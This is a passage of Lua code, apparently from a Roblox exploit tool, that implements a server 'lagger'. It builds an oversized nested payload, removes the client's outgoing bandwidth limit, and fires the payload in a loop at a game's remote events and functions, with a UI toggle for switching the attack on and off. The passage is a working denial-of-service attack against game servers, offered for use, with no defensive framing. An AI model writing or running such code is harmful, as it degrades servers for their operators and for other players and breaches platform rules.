        local intensity = math.clamp(State.laggerIntensity or 7, 1, 10)
        local cfg = getLaggerConfig(intensity)
        local bomb = getPayload(cfg.depth, cfg.copies)
        local fireWait = math.max(cfg.wait, 0.08)
        local NetworkClient = game:GetService("NetworkClient")

        while State.laggerActive do
            pcall(function() NetworkClient:SetOutgoingKBPSLimit(math.huge) end)
            pcall(function()
                if remote:IsA("RemoteEvent") or remote:IsA("UnreliableRemoteEvent") then
                    remote:FireServer(bomb)
                elseif remote:IsA("RemoteFunction") then
                    remote:InvokeServer(bomb)
                end
            end)
            pcall(function() NetworkClient:SetOutgoingKBPSLimit(0) end)
            task.wait(fireWait)
        end
    end

    local function setLaggerState(on)
        State.laggerActive = on
        local col = on and Color3.fromRGB(80, 255, 100) or Color3.fromRGB(255, 70, 70)
